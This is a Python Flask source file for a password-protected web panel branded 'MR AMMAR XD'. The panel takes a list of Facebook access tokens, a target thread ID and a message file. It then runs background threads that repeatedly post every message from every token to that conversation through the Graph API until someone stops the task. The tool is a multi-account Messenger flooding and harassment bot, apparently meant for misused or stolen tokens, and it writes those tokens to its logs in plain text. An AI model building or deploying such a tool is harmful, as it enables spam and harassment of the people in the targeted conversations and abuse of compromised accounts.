from flask import Flask, request, render_template_string, redirect, url_for, session, flash
import requests
from threading import Thread, Event
import time
import random
import string
import os
from functools import wraps

app = Flask(__name__)
# Use environment variables for configuration in Render/production
app.debug = os.environ.get('FLASK_DEBUG', 'False').lower() in ('1', 'true', 'yes')
app.secret_key = os.environ.get('SECRET_KEY', 'please-change-this-secret')

# Simple user database (in production, use a proper database)
# Use a single admin user; credentials can be injected via environment variables
users = {
    os.environ.get('ADMIN_USER', 'ammar'): os.environ.get('ADMIN_PASSWORD', 'change_me')
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (compatible; MR AMMAR XDBot/1.0)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

stop_events = {}
threads = {}


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{mn} {message1}"
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                    if response.status_code == 200:
                        app.logger.info(f"Message sent from token {access_token}: {message}")
                    else:
                        app.logger.warning(f"Send failed ({response.status_code}) from token {access_token}: {response.text}")
                except Exception as e:
                    app.logger.exception(f"Exception sending message: {e}")
                time.sleep(time_interval)


# Shared UI assets: CSS/JS live in static/bg.css and static/bg.js (served by Flask static folder)
# Templates reference a video_url and poster passed by the route so the same shared JS/CSS manage playback.

LOGIN_TEMPLATE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MR AMMAR XD Admin - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='bg.css') }}">
  </head>
  <body class="dark">

    <!-- Fullscreen background video (fixed, behind content). JS will manage prefers-reduced-motion and visibility API. -->
    <video id="bg-video" class="bg-video" autoplay muted loop playsinline preload="auto" poster="{{ poster }}">
      <source src="{{ video_url }}" type="video/mp4">
    </video>

    <div class="overlay" aria-hidden="true"></div>

    <main class="center-wrap fade-in">
      <div class="login-card glass">
        <div class="brand-row">
          <h1 class="brand">MR AMMAR XD</h1>
          <p class="tag">Secure Conversation Management</p>
        </div>

        {% with messages = get_flashed_messages() %}
          {% if messages %}
            <div class="alert">{{ messages[0] }}</div>
          {% endif %}
        {% endwith %}

        <form method="post" class="login-form">
          <label class="form-label">Email or Username
            <input type="text" name="username" required placeholder="you@example.com or username">
          </label>
          <label class="form-label">Password
            <input type="password" name="password" required placeholder="Password">
          </label>

          <div class="row between">
            <label class="checkbox"><input type="checkbox" name="remember"> Remember me</label>
            <a class="link" href="#">Forgot password?</a>
          </div>

          <button class="btn primary glow">Sign in</button>

          <div class="signup">Don't have an account? <a class="link" href="#">Sign up</a></div>
        </form>
      </div>
    </main>

    <script src="{{ url_for('static', filename='bg.js') }}"></script>
  </body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MR AMMAR XD - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='bg.css') }}">
  </head>
  <body class="dark">

    <video id="bg-video" class="bg-video" autoplay muted loop playsinline preload="auto" poster="{{ poster }}">
      <source src="{{ video_url }}" type="video/mp4">
    </video>

    <div class="overlay" aria-hidden="true"></div>

    <nav class="navbar fade-in-down">
      <div class="nav-left">
        <div class="logo">MR AMMAR XD</div>
      </div>
      <div class="nav-right">
        <a class="nav-link" href="#">Home</a>
        <a class="nav-link" href="#">Tasks</a>
        <a class="nav-link" href="#">Settings</a>
        <a class="nav-icon" href="#">{{ session.get('username') }}</a>
      </div>
    </nav>

    <header class="hero fade-in">
      <div class="hero-inner">
        <h1 class="hero-title">Command the Conversation</h1>
        <p class="hero-sub">Dispatch messages with precision. Dark theme, bold energy, and control at your fingertips.</p>
        <div class="hero-cta">
          <a href="#send" class="btn primary glow">Create Task</a>
        </div>
      </div>
    </header>

    <section id="send" class="container fade-in-up">
      <div class="card form-card">
        <form method="post" enctype="multipart/form-data">
          <div class="field">
            <label>Token option</label>
            <select name="tokenOption" id="tokenOption" onchange="toggleTokenInput()">
              <option value="single">Single token</option>
              <option value="multiple">Upload token file</option>
            </select>
          </div>

          <div class="field" id="singleTokenInput">
            <label>Access token</label>
            <input name="singleToken" placeholder="Enter single token">
          </div>
          <div class="field" id="tokenFileInput" style="display:none;">
            <label>Token file (one token per line)</label>
            <input type="file" name="tokenFile">
          </div>

          <div class="grid-2">
            <div class="field">
              <label>Thread ID</label>
              <input name="threadId" required placeholder="Target thread id">
            </div>
            <div class="field">
              <label>Sender name</label>
              <input name="kidx" required placeholder="Sender display name">
            </div>
          </div>

          <div class="field">
            <label>Time interval (seconds)</label>
            <input type="number" min="1" name="time" value="2">
          </div>

          <div class="field">
            <label>Message file (one message per line)</label>
            <input type="file" name="txtFile" required>
          </div>

          <button class="btn primary glow">Start Task</button>
        </form>
      </div>

      <div class="card small-card">
        <h6>Active Tasks</h6>
        <ul class="tasks">
          {% for tid in active_tasks %}
            <li>{{ tid }}</li>
          {% else %}
            <li class="muted">No active tasks</li>
          {% endfor %}
        </ul>
      </div>
    </section>

    <footer class="footer">© {{ year }} MR AMMAR XD</footer>

    <script src="{{ url_for('static', filename='bg.js') }}"></script>
  </body>
</html>
"""


@app.route('/login', methods=['GET', 'POST'])
def login():
    login_clip = os.environ.get('LOGIN_VIDEO', 'https://res.cloudinary.com/sfdbglyz/video/upload/f_auto,q_auto/clip1_2s-7s.mp4')
    login_poster = os.environ.get('LOGIN_POSTER', login_clip.replace('.mp4', '.jpg'))
    if request.method == 'POST':
        username = (request.form.get('username') or '').strip()
        password = request.form.get('password') or ''
        if username and username in users and users[username] == password:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('send_message'))
        flash('Invalid username or password')
    return render_template_string(LOGIN_TEMPLATE, default_user=list(users.keys())[0], video_url=login_clip, poster=login_poster)


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/', methods=['GET', 'POST'])
@login_required
def send_message():
    # Main/home video
    main_clip = os.environ.get('MAIN_VIDEO', 'https://res.cloudinary.com/sfdbglyz/video/upload/f_auto,q_auto/clip2_21s-26s.mp4')
    main_poster = os.environ.get('MAIN_POSTER', main_clip.replace('.mp4', '.jpg'))

    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        access_tokens = []
        if token_option == 'single':
            single = (request.form.get('singleToken') or '').strip()
            if single:
                access_tokens = [single]
        else:
            token_file = request.files.get('tokenFile')
            if token_file:
                try:
                    access_tokens = token_file.read().decode().strip().splitlines()
                except Exception:
                    access_tokens = []

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx') or ''
        try:
            time_interval = max(1, int(request.form.get('time') or 2))
        except ValueError:
            time_interval = 2

        txt_file = request.files.get('txtFile')
        messages = []
        if txt_file:
            try:
                messages = txt_file.read().decode().splitlines()
            except Exception:
                messages = []

        if not access_tokens or not thread_id or not messages:
            flash('Please provide tokens, thread id and message file')
            return render_template_string(DASHBOARD_TEMPLATE, active_tasks=list(stop_events.keys()), year=time.localtime().tm_year, video_url=main_clip, poster=main_poster)

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        thread.daemon = True
        threads[task_id] = thread
        thread.start()
        flash(f'Task started with ID: {task_id}')

    return render_template_string(DASHBOARD_TEMPLATE, active_tasks=list(stop_events.keys()), year=time.localtime().tm_year, video_url=main_clip, poster=main_poster)


@app.route('/stop', methods=['POST'])
@login_required
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        stop_events.pop(task_id, None)
        threads.pop(task_id, None)
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'


# Health endpoint for platform healthchecks
@app.route('/health')
def health():
    return 'OK', 200


if __name__ == '__main__':
    # For development only. In production Render you should run with gunicorn (Procfile included).
    port = int(os.environ.get('PORT', 5000))
    app.logger.info(f"Starting development server on 0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port)
